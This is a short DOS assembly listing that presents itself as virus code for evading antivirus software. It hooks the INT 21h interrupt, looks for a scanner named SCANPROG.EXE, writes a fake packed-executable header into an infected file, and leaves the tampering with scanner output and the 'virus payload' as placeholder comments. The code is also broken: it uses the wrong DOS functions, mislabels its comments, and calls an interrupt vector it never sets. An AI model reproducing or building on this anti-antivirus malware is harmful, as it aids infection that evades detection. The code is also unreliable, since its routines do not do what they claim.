.model small
.stack 100h

.data
    anti_virus_name db 'SCANPROG.EXE', 0
    fake_packed_header db 'MZ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    int21_vector dd ?
    int21_old_handler dd ?

.code
start:
    ; Save the original INT 21h handler
    mov ah, 35h
    mov al, 21h
    int 21h
    mov word ptr [int21_old_handler], bx
    mov word ptr [int21_old_handler+2], es

    ; Check if anti-virus program is running
    mov ah, 3Bh
    lea dx, anti_virus_name
    int 21h
    jnc anti_virus_found

    ; Modify command-line parameters for anti-virus program
    ; (e.g. change scan options to skip certain files)
    ; ...

    ; Alter the output of the anti-virus program
    ; (e.g. change 'Virus found!' to 'All clear!')
    ; ...

    ; Make the infected file look like a packed executable
    mov ah, 40h
    mov cx, 16
    lea dx, fake_packed_header
    int 21h

    ; Jump to original program entry point
    jmp original_entry

anti_virus_found:
    ; Disable or unload the anti-virus program
    ; (e.g. patch the INT 21h handler to bypass the anti-virus checks)
    mov ah, 25h
    mov al, 21h
    lea dx, int21_handler
    int 21h

    ; Proceed with virus payload
    ; ...

int21_handler:
    ; Custom INT 21h handler that bypasses anti-virus checks
    cmp ah, 3Bh  ; Check if it's a 'EXEC' call
    je original_int21
    cmp ah, 4Bh  ; Check if it's a 'LOAD' call
    je original_int21
    ; Add more checks as needed to bypass anti-virus routines
    jmp short original_int21

original_int21:
    ; Call the original INT 21h handler
    push ds
    push es
    push ax
    push bx
    push cx
    push dx
    mov ax, word ptr [int21_old_handler]
    mov dx, word ptr [int21_old_handler+2]
    mov ds, dx
    call dword ptr [int21_vector]
    pop dx
    pop cx
    pop bx
    pop ax
    pop es
    pop ds
    retf

original_entry:
    ; Jump to original program entry point
    ; ...

end start
